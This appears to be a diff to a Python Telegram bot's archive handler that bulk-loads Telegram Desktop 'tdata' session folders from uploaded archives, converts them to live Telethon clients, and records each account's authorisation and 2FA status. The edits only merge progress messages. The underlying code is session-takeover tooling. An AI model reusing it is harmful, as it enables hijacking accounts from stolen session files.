@@ -325,31 +325,29 @@ async def handle_archive(client, message):
     tempdir = tempfile.mkdtemp()
     results = []
     try:
-        await message.reply("🟢 Sᴛᴇᴘ 1: Sᴛᴀʀᴛɪɴɢ ᴘʀᴏᴄᴇssɪɴɢ...")
-
-        await message.reply("📥 Sᴛᴇᴘ 1.1: Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...")
+        sy = await message.reply("• Sᴛᴇᴘ 1: Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...")
         try:
             file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
-            await message.reply(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ `{file_path}`")
+            await sy.edit(f"• Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ `{file_path}`")
         except Exception as e:
-            return await message.reply(f"❌ Sᴛᴇᴘ 1 (Dᴏᴡɴʟᴏᴀᴅ) ꜰᴀɪʟᴇᴅ: {e}")
+            return await sy.edit(f"❌ Sᴛᴇᴘ 1 (Dᴏᴡɴʟᴏᴀᴅ) ꜰᴀɪʟᴇᴅ: {e}")
 
         extract_dir = os.path.join(tempdir, "extracted")
         os.makedirs(extract_dir, exist_ok=True)
-        await message.reply(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ {file_path}")
+        await sy.edit(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ {file_path}")
         await show_zip_structure(file_path, message, client)
 
         # --- Step 2: Extraction
-        await message.reply("📦 Sᴛᴇᴘ 2.1: Tʀʏɪɴɢ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴀʀᴄʜɪᴠᴇ...")
+        await sy.edit("📦 Sᴛᴇᴘ 2.1: Tʀʏɪɴɢ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴀʀᴄʜɪᴠᴇ...")
         try:
             with zipfile.ZipFile(file_path, "r") as zip_ref:
                 zip_ref.extractall(extract_dir)
-            await message.reply(f"✅ Sᴛᴇᴘ 2.2: Zɪᴘ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
+            await sy.edit(f"✅ Sᴛᴇᴘ 2.2: Zɪᴘ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
         except Exception as e_zip:
             try:
                 with rarfile.RarFile(file_path, "r") as rar_ref:
                     rar_ref.extractall(extract_dir)
-                await message.reply(f"✅ Sᴛᴇᴘ 2.3: Rᴀʀ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
+                await sy.edit(f"✅ Sᴛᴇᴘ 2.3: Rᴀʀ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
             except Exception as e_rar:
                 return await message.reply(
                     f"❌ Sᴛᴇᴘ 2 (Exᴛʀᴀᴄᴛɪᴏɴ) ꜰᴀɪʟᴇᴅ.\n"
@@ -357,7 +355,7 @@ async def handle_archive(client, message):
                 )
 
         # --- Step 3: Detect or Build tdata
-        await message.reply("🔍 Sᴛᴇᴘ 3: Sᴇᴀʀᴄʜɪɴɢ / ʙᴜɪʟᴅɪɴɢ `ᴛᴅᴀᴛᴀ`...")
+        await sy.edit("🔍 Sᴛᴇᴘ 3: Sᴇᴀʀᴄʜɪɴɢ / ʙᴜɪʟᴅɪɴɢ `ᴛᴅᴀᴛᴀ`...")
 
         tdata_paths = []
 
@@ -369,7 +367,7 @@ async def handle_archive(client, message):
 
             if has_d877 and has_keys:
                 tdata_paths.append(root)
-                await message.reply(f"🔎 Fᴏᴜɴᴅ ᴠᴀʟɪᴅ ᴛᴅᴀᴛᴀ ꜰᴏʟᴅᴇʀ: {root}")
+                await sy.edit(f"🔎 Fᴏᴜɴᴅ ᴠᴀʟɪᴅ ᴛᴅᴀᴛᴀ ꜰᴏʟᴅᴇʀ: {root}")
 
             elif has_d877:
                 fake_tdata = os.path.join(root, "tdata")
@@ -379,12 +377,12 @@ async def handle_archive(client, message):
                         shutil.move(os.path.join(root, item),
                                     os.path.join(fake_tdata, item))
                 tdata_paths.append(fake_tdata)
-                await message.reply(f"🔧 Bᴜɪʟᴛ ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")
+                await sy.edit(f"🔧 Bᴜɪʟᴛ ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")
 
             for f in files:
                 if f.lower().endswith(".rar"):
                     rar_path = os.path.join(root, f)
-                    await message.reply(f"📂 Fᴏᴜɴᴅ ɪɴɴᴇʀ Rᴀʀ: {rar_path}")
+                    await sy.edit(f"📂 Fᴏᴜɴᴅ ɪɴɴᴇʀ Rᴀʀ: {rar_path}")
                     try:
                         rar_extract_dir = os.path.join(root, "rar_extracted")
                         os.makedirs(rar_extract_dir, exist_ok=True)
@@ -405,13 +403,13 @@ async def handle_archive(client, message):
                         await message.reply(f"🔧 Wʀᴀᴘᴘᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴀs ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")
 
         if not tdata_paths:
-            return await message.reply("⚠️ Nᴏ `ᴛᴅᴀᴛᴀ` ꜰᴏʟᴅᴇʀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ᴛʜɪs ᴀʀᴄʜɪᴠᴇ.")
+            return await sy.edit("⚠️ Nᴏ `ᴛᴅᴀᴛᴀ` ꜰᴏʟᴅᴇʀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ᴛʜɪs ᴀʀᴄʜɪᴠᴇ.")
 
         # --- Step 4: Process tdata
         start_num = await db.get_next_account_num()
         for offset, tdata_path in enumerate(tdata_paths, 1):
             idx = start_num + offset
-            await message.reply(f"➡️ Sᴛᴇᴘ 4.{idx}: Pʀᴏᴄᴇssɪɴɢ ᴛᴅᴀᴛᴀ ᴀᴛ `{tdata_path}`")
+            await sy.edit(f"➡️ Sᴛᴇᴘ 4.{idx}: Pʀᴏᴄᴇssɪɴɢ ᴛᴅᴀᴛᴀ ᴀᴛ `{tdata_path}`")
             try:
                 await show_tdata_structure_and_rar(tdata_path, message)
                 
@@ -419,11 +417,11 @@ async def handle_archive(client, message):
                 if not tdesk.isLoaded():
                     results.append(f"#{idx} ⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ (ᴄᴏʀʀᴜᴘᴛᴇᴅ ᴛᴅᴀᴛᴀ)")
                     continue
-                await message.reply(f"✅ Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{idx}")
+                await sy.edit(f"✅ Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{idx}")
 
                 tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                 await tele_client.connect()
-                await message.reply(f"📡 Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{idx}")
+                await sy.edit(f"📡 Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{idx}")
 
                 if not await tele_client.is_user_authorized():
                     results.append(f"#{idx} ⚠️ Nᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ (ɴᴇᴇᴅs ʟᴏɢɪɴ / 2FA)")
@@ -465,7 +463,7 @@ async def handle_archive(client, message):
                 )
 
                 await tele_client.disconnect()
-                await message.reply(f"✅ Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{idx}")
+                await sy.edit(f"✅ Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{idx}")
 
             except SessionPasswordNeededError:
                 results.append(f"#{idx} ❌ 2FA: Eɴᴀʙʟᴇᴅ (ᴘᴀssᴡᴏʀᴅ ʀᴇQᴜɪʀᴇᴅ)")
